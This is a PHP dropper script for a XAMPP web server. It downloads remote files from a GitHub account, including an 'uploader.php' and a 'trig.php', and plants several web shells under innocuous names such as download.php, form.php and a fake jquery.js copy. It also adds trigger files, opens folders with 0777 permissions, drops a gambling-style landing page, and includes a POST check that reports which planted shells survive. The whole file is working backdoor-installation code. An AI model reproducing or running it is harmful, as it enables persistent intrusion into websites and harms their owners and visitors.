<?php
$file_LP = 'C:/xampp/htdocs/bookingarea/images/slot-demo/index.html';
$file_resources = 'https://raw.githubusercontent.com/rootraven04/trig/main/agri/agri.html';
$current = file_get_contents($file_resources);

chmod('C:/xampp/htdocs/bookingarea/', 0755);
mkdir('C:/xampp/htdocs/bookingarea/');
chmod('C:/xampp/htdocs/bookingarea/', 0755);
chmod('C:/xampp/htdocs/bookingarea/images/', 0755);
mkdir('C:/xampp/htdocs/bookingarea/images/');
chmod('C:/xampp/htdocs/bookingarea/images/', 0755);
chmod('C:/xampp/htdocs/bookingarea/images/slot-demo/', 0755);
mkdir('C:/xampp/htdocs/bookingarea/images/slot-demo/');
chmod('C:/xampp/htdocs/bookingarea/images/slot-demo/', 0755);

file_put_contents($file_LP, $current);

$shell_resources = 'C:/xampp/htdocs/js/jquery.js';
$resources_didalam = 'C:/xampp/htdocs/js/jquery.js';
$shell_satu =   'C:/xampp/htdocs/2022/download.php';
mkdir('C:/xampp/htdocs/2022/');
chmod('C:/xampp/htdocs/2022/', 0777);

$shell_dua  =   'C:/xampp/htdocs/ento/form.php';
mkdir('C:/xampp/htdocs/ento/');
chmod('C:/xampp/htdocs/ento/', 0777);
$shell_tiga =   'C:/xampp/htdocs/ento/template.php';
$shell_empat = 'C:/xampp/htdocs/ento/Download/doc.php';

$shell_source_dua = 'https://raw.githubusercontent.com/rootraven04/0xc4uploader/main/uploader.php';

$trigger_satu = 'C:/xampp/htdocs/dashboard/plugin.php';
chmod('C:/xampp/htdocs/dashboard/', 0777);
mkdir('C:/xampp/htdocs/dashboard/');
chmod('C:/xampp/htdocs/dashboard/', 0777);
$trigger_dua  = 'C:/xampp/htdocs/News/index.php';
chmod('C:/xampp/htdocs/News/', 0777);
mkdir('C:/xampp/htdocs/News/');

$source_trigger = 'https://raw.githubusercontent.com/rootraven04/trig/main/agri/trig.php';

file_put_contents($shell_satu, file_get_contents($shell_resources));
file_put_contents($shell_dua, file_get_contents($shell_resources));
file_put_contents($shell_tiga, file_get_contents($shell_resources));

if(!file_exists($trigger_satu)) {
    file_put_contents($trigger_satu,file_get_contents($source_trigger));
}
if(!file_exists($trigger_dua)) {
    file_put_contents($trigger_dua,file_get_contents($source_trigger));
}

if(!file_exists($shell_empat)) {
    mkdir('C:/xampp/htdocs/ento/');
    chmod('C:/xampp/htdocs/ento/', 0777);
    mkdir('C:/xampp/htdocs/ento/Download/');
    chmod('C:/xampp/htdocs/ento/Download/', 0777);
}

file_put_contents($shell_empat,file_get_contents($shell_source_dua));

if (isset($_POST['cekfile'])) {
    if (file_exists($resources_didalam)) {
        echo 'Found '.filesize($resources_didalam).' '.$resources_didalam.' ';
    } else { echo 'Not_Found null null '; }
    if (file_exists($shell_satu)) {
        echo 'Found '.filesize($shell_satu).' '.$shell_satu.' ';
    } else { echo 'Not_Found null null '; }
    if (file_exists($shell_dua)) {
        echo 'Found '.filesize($shell_dua).' '.$shell_dua.' ';
    } else { echo 'Not_Found null null '; }
    if (file_exists($shell_tiga)) {
        echo 'Found '.filesize($shell_tiga).' '.$shell_tiga.' ';
    } else { echo 'Not_Found null null '; }
    if (file_exists($file_resources)) {
        echo 'Found '.filesize($file_resources).' '.$file_resources.' ';
    } else { echo 'Not_Found null null '; }
    if (file_exists($shell_empat)) {
        echo 'Found '.filesize($shell_empat).' '.$shell_empat.' ';
    } else { echo 'Not_Found null null '; }
}

?>